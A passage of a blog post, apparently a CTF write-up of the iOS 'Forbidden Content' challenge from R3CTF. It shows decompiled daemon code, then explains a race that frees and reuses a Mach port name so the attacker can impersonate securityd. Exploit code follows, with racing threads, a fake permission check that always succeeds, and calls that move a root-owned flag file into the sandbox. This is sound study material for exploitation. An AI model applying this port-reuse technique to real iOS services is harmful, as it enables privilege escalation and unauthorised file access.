class="line">          mach_error_string(error_value);</span><br><span class="line">          NSLog(&amp;stru_100008428);</span><br><span class="line">          v15 = error_value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        NSLog(&amp;stru_1000083A8);</span><br><span class="line">        fclose(v6);</span><br><span class="line">        v15 = <span class="number">5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      NSLog(&amp;stru_100008388);</span><br><span class="line">      v15 = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = __OFSUB__(*(_QWORD *)__stack_chk_guard_ptr, v17);</span><br><span class="line">  <span class="keyword">return</span> v15;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The <code>move_file()</code> function will also update the permission of the file.</p>
+<p>The result will be send back to the callback port. <code>securityd</code> is a simple daemon that verifies the user of the request and the actual file owner.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_check_perm</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">v4</span>;</span> <span class="comment">// [xsp+18h] [xbp-A8h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [xsp+A8h] [xbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [xsp+B4h] [xbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [xsp+B8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;%s: check permission for uid=%d path=%s\n&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kern_return_t SERVER_check_perm(mach_port_t, uint32_t, const char *)&quot;</span>,</span><br><span class="line">    a2,</span><br><span class="line">    a3);</span><br><span class="line">  <span class="keyword">if</span> ( stat(v5, &amp;v4) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  <span class="keyword">if</span> ( v4.st_uid != v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;owner: %d\n&quot;</span>, v4.st_uid);</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Permission denied\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Vulnerability">Vulnerability</h2>
+<p>The event handling is wrapped in a <code>dispatch_async</code> block which means the event processing can be raced. The problem now becomes what should we race for?</p>
+<p>In XNU, the <code>mach_port_name_t</code> is a 32-bit integer used as an index in the <code>task</code>’s <code>is_table</code> to find the real port in kernel space.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get the address of ipc_port in Def1nit3lyN0tAJa1lbr3akTool</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">ipc_entry_lookup</span><span class="params">(<span class="keyword">mach_port_t</span> port_name)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kfd</span> *<span class="title">kfd</span> =</span> (struct kfd *)__kfd;</span><br><span class="line">    <span class="keyword">uint64_t</span> task = kfd-&gt;info.kernel.current_task;</span><br><span class="line">    <span class="keyword">uint64_t</span> itk_space = kread64(task + off_task_itk_space);</span><br><span class="line">    <span class="keyword">uint32_t</span> port_index = MACH_PORT_INDEX(port_name);</span><br><span class="line">    <span class="keyword">uint64_t</span> is_table = kread64(itk_space + off_ipc_space_is_table);</span><br><span class="line">    is_table = kernel_pointer_decode(is_table);</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = is_table + port_index * <span class="number">0x18</span>;</span><br><span class="line">    <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">port_name_to_ipc_port</span><span class="params">(<span class="keyword">mach_port_t</span> port_name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = ipc_entry_lookup(port_name);</span><br><span class="line">    <span class="keyword">uint64_t</span> ipc_port = kread64(entry + <span class="number">0x0</span>);</span><br><span class="line">    <span class="keyword">return</span> ipc_port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">port_name_to_ipc_port_for_pid</span><span class="params">(<span class="keyword">mach_port_t</span> name, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> entry = ipc_entry_lookup_for_pid(name, pid);</span><br><span class="line">    <span class="keyword">return</span> kread64(entry);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>This 32-bit integer can be reused after deallocation. Notice that our application can also get a send right to <code>securityd</code>, what if we can deallocate the <code>securityd</code> in <code>fileviewerd</code> and reuse the port name?</p>
+<p>In our own process, we can look up for a send right to <code>securityd</code> and set it as the callback port in <code>fileviewerd</code>. When registering the callback port, <code>fileviewerd</code> will deallocate the old callback port if it exists.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( global_callback_port )</span><br><span class="line">&#123;</span><br><span class="line">  mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, global_callback_port);</span><br><span class="line">  NSLog(&amp;stru_100008288);</span><br><span class="line">  NSLog(&amp;stru_1000082A8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So if we call this twice, the <code>securityd</code> port will be deallocated. But <code>fileviewerd</code> still uses the old port name to send messages to <code>securityd</code>. If we keep registering callback port we can probably reuse the port name and all messages sent to <code>securityd</code> will be sent to our callback port. This enables an MITM attack.</p>
+<h2 id="Exploit">Exploit</h2>
+<p>First we can look up for the <code>securityd</code> port and set it as the callback port.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lookup the receiver port using the bootstrap server.</span></span><br><span class="line"><span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bootstrap_port, <span class="string">&quot;com.xia0o0o0o.fileviewerd&quot;</span>, &amp;port);</span><br><span class="line"><span class="keyword">int</span> mypid = getpid();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My pid is %d\n&quot;</span>, mypid);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bootstrap_look_up() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Port right name %d\n&quot;</span>, port);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, <span class="string">&quot;com.xia0o0o0o.securityd&quot;</span>, &amp;securityd_port);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bootstrap_look_up() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">kr = CLIENT_register_callback(port, securityd_port);</span><br><span class="line"><span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CLIENT_register_callback() failed with code 0x%x\n&quot;</span>, kr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Then we can try to decrease the reference count of the port by</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">race_condition</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!trigger) &#123; &#125;</span><br><span class="line">    CLIENT_register_callback(port, dummy);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec_ref</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create 2 threads to call race_condition()</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thread1, thread2;</span><br><span class="line">    pthread_create(&amp;thread1, <span class="literal">NULL</span>, race_condition, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thread2, <span class="literal">NULL</span>, race_condition, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    trigger = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// wait for the threads to finish</span></span><br><span class="line">    pthread_join(thread1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thread2, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If everything goes well, the <code>securityd</code> port will be deallocated and we can reuse the port name.<br>
+We can create our own <code>securityd</code> message handling function and always return <code>0</code> to bypass the permission check.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> got = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// int got = 0;</span></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">SERVER_check_perm</span><span class="params">(<span class="keyword">mach_port_t</span> server_port, <span class="keyword">uint32_t</span> uid, <span class="keyword">const</span> <span class="keyword">char</span> *path)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;check permission for uid=%d path=%s\n&quot;</span>, uid, path);</span><br><span class="line">    got = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>And now we can keep registering the callback port and wait for the message from <code>fileviewerd</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!got) &#123;</span><br><span class="line">    CLIENT_remove_callback(port);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;fake_securityd_port);</span><br><span class="line">    mach_port_extract_right(mach_task_self(),</span><br><span class="line">                            fake_securityd_port, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;r);</span><br><span class="line">    CLIENT_register_callback(port, listener_send_right);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    <span class="keyword">dispatch_queue_main_t</span> <span class="built_in">queue</span> = dispatch_queue_create(<span class="string">&quot;queue&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(</span><br><span class="line">        DISPATCH_SOURCE_TYPE_MACH_RECV, fake_securityd_port, <span class="number">0</span>, <span class="built_in">queue</span>);</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">      dispatch_mig_server(source, MAX_MSG_SIZE, security_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_resume(source);</span><br><span class="line"></span><br><span class="line">    CLIENT_read_file(port, <span class="string">&quot;/var/jb/var/root/flag&quot;</span>);</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Then we can move the flag into our sandbox and change its permission</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLIENT_move_file(port, <span class="string">&quot;/var/jb/var/root/flag&quot;</span>, [NSString stringWithFormat:@<span class="string">&quot;%@/flag&quot;</span>, [NSBundle mainBundle].bundleURL.path].UTF8String);</span><br></pre></td></tr></table></figure>
+<p>And that’s it! We can now read the flag in our own sandbox.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+      <!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Home</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../index.html">Home</a>
+        </span>
+      </li><!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Writing</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../archives/">Writing</a>
+        </span>
+      </li><!--
+     --><li style="display: block;">
+        <span style="display: flex; align-items: center;">
+          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
+            <title>Projects</title>
+            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
+          </svg>
+          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
+        </span>
+      </li>
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn0win-Forbidden-Content"><span class="toc-number">1.</span> <span class="toc-text">pwn0win - Forbidden Content</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&text=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&is_video=false&description=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn0win: iOS pwning challenges in R3CTF&body=Check out this article: https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&name=Pwn0win: iOS pwning challenges in R3CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&t=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Xia0o0o0o
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="../../../../index.html">Home</a></li><!--
+     --><!--
+       --><li><a href="../../../../archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="../../../../js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
